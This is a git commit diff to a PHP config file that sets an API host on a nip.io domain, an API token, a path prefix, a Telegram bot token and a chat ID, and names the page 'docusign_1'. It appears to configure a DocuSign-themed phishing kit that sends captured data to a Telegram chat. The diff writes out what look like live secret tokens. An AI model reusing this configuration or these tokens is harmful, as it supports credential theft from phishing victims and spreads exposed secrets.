fb8ee48e31c9090a8080f958cf08a42716ac47f4
zechariah123 <zechariahzparker@gmail.com>
2026-07-02 20:46:59 -0400

    Modify config.php with new API and Telegram tokens
    Updated API and Telegram configuration values.

--- config.php
+++ config.php
@@ -1,11 +1,11 @@
 <?php
 
-$api_host = "";
-$api_token = "";
-$api_prefix = "";
+$api_host = "c30c069656070f.880008df.nip.io";
+$api_token = "5d4e4579e4ca951cdfbea106d0f8c0";
+$api_prefix = "/gyf78erg";
 
-$telegram_bot_token = "";
-$telegram_chat_id = "";
+$telegram_bot_token = "8928618766:AAFTowV26o-3B6Ft2Yr_9wmL0EWQ11RRf_4";
+$telegram_chat_id = "7121346338";
 
 $page_name = "docusign_1";
 
